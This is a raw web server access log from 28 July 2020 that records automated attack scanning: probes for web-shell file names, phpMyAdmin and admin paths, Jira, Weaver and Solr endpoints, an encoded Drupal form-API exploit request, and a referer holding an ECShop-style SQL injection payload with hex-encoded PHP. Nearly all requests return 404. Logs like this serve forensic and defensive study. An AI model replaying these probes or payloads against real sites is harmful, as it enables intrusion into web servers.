- - [28/Jul/2020:00:58:18 +0000] "GET /ak.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:20 +0000] "GET /hhhhhh.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:20 +0000] "GET /meijianxue.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:21 +0000] "GET /no1.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:21 +0000] "GET /python.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:22 +0000] "GET /woshimengmei.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:24 +0000] "GET /taisui.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:24 +0000] "GET /xiaxia.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:25 +0000] "GET /kk.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:25 +0000] "GET /xsser.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:26 +0000] "GET /zzz.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:28 +0000] "GET /dp.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:28 +0000] "GET /hs.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:29 +0000] "GET /1ts.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:29 +0000] "GET /haiyan.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:30 +0000] "GET /phpdm.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:32 +0000] "GET /5678.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:32 +0000] "GET /root11.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:33 +0000] "GET /xiu.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
- - [28/Jul/2020:00:58:33 +0000] "POST /wuwu11.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:58:34 +0000] "POST /xw.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:58:36 +0000] "POST /9678.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:58:36 +0000] "POST /wc.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:58:37 +0000] "POST /xx.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:58:37 +0000] "POST /xx.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:58:38 +0000] "POST /s.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:58:40 +0000] "POST /sheep.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:58:40 +0000] "POST /qaq.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:58:41 +0000] "POST /my.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:58:41 +0000] "POST /qq.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:58:42 +0000] "POST /aaa.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:58:43 +0000] "POST /hhh.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:58:43 +0000] "POST /jjj.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:58:44 +0000] "POST /vvv.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:58:44 +0000] "POST /www.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:58:48 +0000] "POST /411.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:58:48 +0000] "POST /415.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:58:52 +0000] "POST /421.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:58:52 +0000] "POST /444.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:58:56 +0000] "POST /a411.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:58:56 +0000] "POST /whoami.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:00 +0000] "POST /whoami.php.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:00 +0000] "POST /9.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:04 +0000] "POST /98k.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:04 +0000] "POST /981.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:08 +0000] "POST /887.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:08 +0000] "POST /888.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:12 +0000] "POST /aa.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:12 +0000] "POST /bb.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:16 +0000] "POST /pp.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:16 +0000] "POST /tt.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:20 +0000] "POST /bbq.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:20 +0000] "POST /jj1.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:24 +0000] "POST /jbb.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:24 +0000] "POST /7o.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:28 +0000] "POST /qwq.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:28 +0000] "POST /nb.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:32 +0000] "POST /kpl.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:32 +0000] "POST /hgx.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:36 +0000] "POST /ppl.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:36 +0000] "POST /tty.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:40 +0000] "POST /ooi.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:40 +0000] "POST /aap.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:44 +0000] "POST /app.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:44 +0000] "POST /bbr.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:45 +0000] "POST /ioi.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:45 +0000] "POST /uuu.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:48 +0000] "POST /ack.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:48 +0000] "POST /shh.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:49 +0000] "POST /ddd.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:49 +0000] "POST /nnn.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:52 +0000] "POST /ttt.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:52 +0000] "POST /bbqq.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:53 +0000] "POST /tyrant.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:53 +0000] "POST /qiqi.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:56 +0000] "POST /zhk.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:56 +0000] "POST /bbv.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:57 +0000] "POST /605.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:00:59:57 +0000] "POST /admin1.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:01:00:00 +0000] "POST /999.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:01:00:00 +0000] "POST /jsc.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:01:00:01 +0000] "POST /jsc.php.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:01:00:01 +0000] "POST /jsc.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:01:00:04 +0000] "POST /kkl.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:01:00:04 +0000] "POST /ks1.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:01:00:05 +0000] "POST /ooo.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:01:00:05 +0000] "POST /wsx.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:01:00:08 +0000] "POST /zmp.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:01:00:08 +0000] "POST /803.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:01:00:09 +0000] "POST /zzz.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:01:00:09 +0000] "POST /ze.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [28/Jul/2020:01:00:12 +0000] "GET /%73%65%65%79%6F%6E/%68%74%6D%6C%6F%66%66%69%63%65%73%65%72%76%6C%65%74 HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [28/Jul/2020:01:00:12 +0000] "GET /secure/ContactAdministrators!default.jspa HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [28/Jul/2020:01:00:13 +0000] "GET /weaver/bsh.servlet.BshServlet HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [28/Jul/2020:01:00:13 +0000] "GET /solr/ HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Safari/537.36"
- - [28/Jul/2020:01:00:16 +0000] "POST /index.php HTTP/1.1" 200 2443 "-" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0"
- - [28/Jul/2020:01:00:16 +0000] "POST /%75%73%65%72/%72%65%67%69%73%74%65%72?%65%6c%65%6d%65%6e%74%5f%70%61%72%65%6e%74%73=%74%69%6d%65%7a%6f%6e%65%2f%74%69%6d%65%7a%6f%6e%65%2f%23%76%61%6c%75%65&%61%6a%61%78%5f%66%6f%72%6d=1&%5f%77%72%61%70%70%65%72%5f%66%6f%72%6d%61%74=%64%72%75%70%61%6c%5f%61%6a%61%78 HTTP/1.1" 404 1871 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0"
- - [28/Jul/2020:01:00:17 +0000] "GET / HTTP/1.1" 200 2443 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [28/Jul/2020:01:00:17 +0000] "GET /joomla/ HTTP/1.1" 404 1871 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [28/Jul/2020:01:00:17 +0000] "POST /%75%73%65%72%2e%70%68%70 HTTP/1.1" 404 1872 "554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:\"id\";s:3:\"'/*\";s:3:\"num\";s:141:\"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24524345275d3b6469652f2a2a2f286d6435284449524543544f52595f534550415241544f5229293b2f2f7d7d,0--\";s:4:\"name\";s:3:\"ads\";}554fcae493e564ee0dc75bdf2ebf94ca" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0"
- - [28/Jul/2020:01:00:18 +0000] "GET /index.php HTTP/1.1" 200 2443 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:18 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 1871 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:19 +0000] "GET /phpMyAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:19 +0000] "GET /pmd/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:20 +0000] "GET /pma/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:24 +0000] "GET /PMA2/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:24 +0000] "GET /pmamy/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:28 +0000] "GET /pmamy2/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:28 +0000] "GET /mysql/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:29 +0000] "GET /admin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:29 +0000] "GET /db/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:32 +0000] "GET /dbadmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:32 +0000] "GET /web/phpMyAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:33 +0000] "GET /admin/pma/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:33 +0000] "GET /admin/PMA/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:36 +0000] "GET /admin/mysql/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:36 +0000] "GET /admin/mysql2/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:37 +0000] "GET /admin/phpmyadmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:37 +0000] "GET /admin/phpMyAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:40 +0000] "GET /admin/phpmyadmin2/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:40 +0000] "GET /mysqladmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:41 +0000] "GET /mysql-admin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:41 +0000] "GET /mysql_admin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:44 +0000] "GET /phpadmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:44 +0000] "GET /phpAdmin/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [28/Jul/2020:01:00:45 +0000] "GET /phpmyadmin0/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
